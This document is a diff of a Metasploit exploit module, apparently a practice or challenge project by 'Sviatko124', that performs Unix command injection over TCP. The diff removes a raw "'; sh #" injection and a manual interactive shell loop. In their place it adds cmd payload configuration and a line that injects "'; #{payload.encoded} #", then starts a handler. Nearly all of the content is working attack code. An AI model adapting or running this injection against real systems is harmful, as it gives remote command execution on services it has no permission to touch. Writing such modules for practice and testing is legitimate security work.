@@ -1,8 +1,8 @@
 require 'msf/core'
-require 'socket'
 
 class MetasploitModule < Msf::Exploit::Remote
   include Msf::Exploit::Remote::Tcp
+
 
   def initialize(info = {})
     super(update_info(info,
@@ -14,9 +14,25 @@ class MetasploitModule < Msf::Exploit::Remote
       'Author'         => ['Sviatko124'],
       'License'        => MSF_LICENSE,
       'References'     => [
-        ['URL', 'http://github.com/Sviatko124/metasploit-challenge-project']
+        ['URL', 'http://github.com/Sviatko124/metasploit-practice-module']
       ],
-      'Targets'        => [['Automatic', {}]],
+      'Platform'       => 'unix',
+      'Arch'           => [ARCH_CMD],
+      'Payload'        => {
+        'Compat' => {
+          'PayloadType' => 'cmd',
+          'ConnectionType' => 'find'
+        }
+      },
+      'Targets' => [
+        [
+          'Unix Command Injection',
+          {
+            'Platform' => 'unix',
+            'Arch' => [ARCH_CMD],
+          }
+        ]
+      ],
       'DefaultTarget'  => 0,
       'DisclosureDate' => '2025-09-23'
     ))
@@ -41,27 +57,13 @@ class MetasploitModule < Msf::Exploit::Remote
       end
     rescue ::EOFError, ::IOError
     end
-
-    sock.put("'; sh #\n")
     print_status("Payload sent!")
 
-    loop do
-      ready = IO.select([$stdin, sock])
-      ready[0].each do |fd|
-        if fd == $stdin
-          input = $stdin.gets
-          break unless input
-          sock.put(input)
-        elsif fd == sock
-          data = sock.recv(4096)
-          if data.empty?
-            print_status("Connection closed by target.")
-            break
-          end
-          print data
-        end
-      end
-    end
-    disconnect
+    sock.put("'; #{payload.encoded} #\n")
+    print_status("Starting handler...")
+    handler
+    
   end
+
 end
+
